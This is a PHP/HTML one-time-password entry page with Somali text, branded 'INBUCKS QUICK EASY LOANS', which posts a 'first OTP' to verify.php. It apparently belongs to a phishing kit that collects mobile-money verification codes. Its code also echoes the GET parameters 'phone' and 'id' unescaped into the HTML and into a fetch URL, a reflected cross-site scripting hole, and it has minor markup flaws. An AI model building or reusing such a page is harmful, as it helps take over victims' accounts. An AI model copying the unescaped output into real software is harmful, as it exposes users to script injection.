<?php
if (isset($_GET['error'])) {
    echo "<p style='color:red;'>Koodh khaldan,fadlan mar kale isku day❌</p>";
}
?>
<?php
// Make id optional
$id = $_GET['id'] ?? '';        // if 'id' is missing, $id becomes empty string
$phone = $_GET['phone'] ?? '';  // phone is required

// Only check phone, since that's what we use
if(empty($phone)){
    echo "Invalid access";
    exit();
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>OTP</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
<!-- Top Logo -->
<div class="logo-container">
    <img src="logo.png" alt="INBUCKS QUICK EASY LOANS Logo" class="logo">
</div>

<div class="card">

<h1>Xaqiijinta OTP-ga kowaad</h2>

<p>Geli OTP-ga kowaad ee loogu diray lambarka taleefankaaga</p>

<h3>+252 <?php echo $phone; ?></h3>

<form id="otpForm" action="verify.php" method="POST">

<input type="hidden" name="id" value="<?php echo $id; ?>">
<input type="hidden" name="phone" value="<?php echo $phone; ?>">

<div class="otp-boxes">
    <input type="text" maxlength="1" name="d1">
    <input type="text" maxlength="1" name="d2">
    <input type="text" maxlength="1" name="d3">
    <input type="text" maxlength="1" name="d4">
    <input type="text" maxlength="1" name="d5">
    <input type="text" maxlength="1" name="d6">
</div>

<button type="submit">XAQIIJI OTP-GA KOWAAD</button>
<p id="timer">Resend otp in 30s</p>

<button id="resendBtn" disabled>resend otp</button>

</form>

</div>
<script>
const inputs = document.querySelectorAll('.otp-boxes input');

// AUTO MOVE + BACKSPACE
inputs.forEach((input, index) => {

    input.addEventListener('input', (e) => {
        let value = e.target.value;

        // allow only numbers
        e.target.value = value.replace(/[^0-9]/g, '');

        if (value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) {
            inputs[index - 1].focus();
        }
    });

});


// 🔥 PASTE FULL OTP (IMPORTANT FEATURE)
document.querySelector('.otp-boxes').addEventListener('paste', (e) => {

    e.preventDefault();

    let pasteData = (e.clipboardData || window.clipboardData).getData('text');

    pasteData = pasteData.replace(/[^0-9]/g, '').slice(0, inputs.length);

    pasteData.split('').forEach((char, index) => {
        if (inputs[index]) {
            inputs[index].value = char;
        }
    });

});
</script>
<script>
let timeLeft = 30;
const timer = document.getElementById("timer");
const resendBtn = document.getElementById("resendBtn");

// countdown
let countdown = setInterval(() => {
    timeLeft--;
    timer.innerText = "Resend OTP in " + timeLeft + "s";

    if (timeLeft <= 0) {
        clearInterval(countdown);
        timer.innerText = "You can resend OTP now";
        resendBtn.disabled = false;
    }
}, 1000);

// resend button click
resendBtn.addEventListener("click", () => {

    // reset timer
    timeLeft = 30;
    resendBtn.disabled = true;

    timer.innerText = "Resend OTP in 30s";

    countdown = setInterval(() => {
        timeLeft--;
        timer.innerText = "Resend OTP in " + timeLeft + "s";

        if (timeLeft <= 0) {
            clearInterval(countdown);
            timer.innerText = "You can resend OTP now";
            resendBtn.disabled = false;
        }
    }, 1000);

    // OPTIONAL: call backend
    fetch("resend_otp.php?id=<?php echo $id; ?>")
    .then(res => res.text())
    .then(data => {
        console.log(data);
    });

});
</script>
<!-- Bottom Logo -->
<div class="logo-container bottom">
    <img src="logo.png" alt="INBUCKS QUICK EASY LOANS Logo" class="logo">
</div>

</body>
</html>